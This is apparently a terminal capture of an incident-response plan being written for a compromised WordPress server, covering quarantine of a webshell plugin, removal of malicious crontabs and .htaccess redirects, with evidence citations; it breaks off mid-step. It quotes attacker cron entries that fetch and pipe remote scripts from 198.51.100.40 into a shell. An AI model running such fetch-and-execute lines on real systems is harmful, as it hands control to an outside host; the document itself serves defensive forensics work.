[?2004l[?2004h> ## 2. Phase 1: Immediate Containment & Evidence Quarantine
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 1.1: Create Secure Forensic Quarantine Storage
[?2004l[?2004h> - **Command:**
[?2004l[?2004h>   ```bash
[?2004l[?2004h>   mkdir -p /root/forensic_quarantine/20240816_incident
[?2004l[?2004h>   chmod 700 /root/forensic_quarantine
[?2004l[?2004h>   ```
[?2004l[?2004h> - **Verification:** Run `ls -ld /root/forensic_quarantine` (Permissions must be `drwx------`).
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 1.2: Quarantine Vulnerable Plugin / Webshell
[?2004l[?2004h> - **Evidence Citation:** `/disk/var/www/html/wp-content/plugins/contact/inc.php:1` (`/sas/alerts.json:4`)
[?2004l[?2004h> - **Command:**
[?2004l[?2004h>   ```bash
[?2004l[?2004h>   mv /var/www/html/wp-content/plugins/contact /root/forensic_quarantine/20240816_incident/
[?2004l[?2004h>   chmod -R 000 /root/forensic_quarantine/20240816_incident/contact
[?2004l[?2004h>   ```
[?2004l[?2004h> - **Verification:** Run `ls -la /var/www/html/wp-content/plugins/contact` (Must return `No such file or directory`).
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 1.3: Remove Persistent `www-data` Crontab
[?2004l[?2004h> - **Evidence Citation:** `/disk/var/spool/cron/crontabs/www-data:2` (`* * * * * ...curl...198.51.100.40/payload.sh`)
[?2004l[?2004h> - **Command:**
[?2004l[?2004h>   ```bash
[?2004l[?2004h>   crontab -u www-data -l > /root/forensic_quarantine/20240816_incident/www-data.crontab.bak
[?2004l[?2004h>   crontab -u www-data -r
[?2004l[?2004h>   ```
[?2004l[?2004h> - **Verification:** Run `crontab -u www-data -l` (Must return `no crontab for www-data`).
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 1.4: Remove Persistent `root` Crontab Beacon
[?2004l[?2004h> - **Evidence Citation:** `/disk/etc/crontab:5` (`# * * * * root <defanged beacon: curl hxxp://198.51.100.40/x | sh>`)
[?2004l[?2004h> - **Command:**
[?2004l[?2004h>   ```bash
[?2004l[?2004h>   cp /etc/crontab /root/forensic_quarantine/20240816_incident/crontab.bak
[?2004l[?2004h>   sed -i "/198.51.100.40/d" /etc/crontab
[?2004l[?2004h>   ```
[?2004l[?2004h> - **Verification:** Inspect `/etc/crontab` to ensure beacon entry is removed.
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 1.5: Revert Malicious `.htaccess` Traffic Redirection
[?2004l[?2004h> - **Evidence Citation:** `/disk/var/www/html/.htaccess:2` (`.htaccess RewriteRule redirect of all traffic to 198.51.100.40`)
[?2004l[?2004h> - **Command:**
[?2004l[?2004h>   ```bash
[?2004l[?2004h>   cp /var/www/html/.htaccess /root/forensic_quarantine/20240816_incident/.htaccess.bak
[?2004l[?2004h>   sed -i "/198.51.100.40/d" /var/www/html/.htaccess
[?2004l[?2004h>   ```
[?2004l[?2004h> - **Verification:** Inspect `/var/www/html/.htaccess` and run test query:  
[?2004l[?2004h>   `curl -I http://localhost/` (Should return 200 OK, not redirect).
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 1.6: Remove Defacement Landing Page
[?2004l[?2004h> - **Evidence Citation:** `/disk/var/www/html/index.html:1` (`/sas/alerts.json:11`)
[?2004l[?2004h> - **Command:**
[?2004l[?2004h>   ```bash
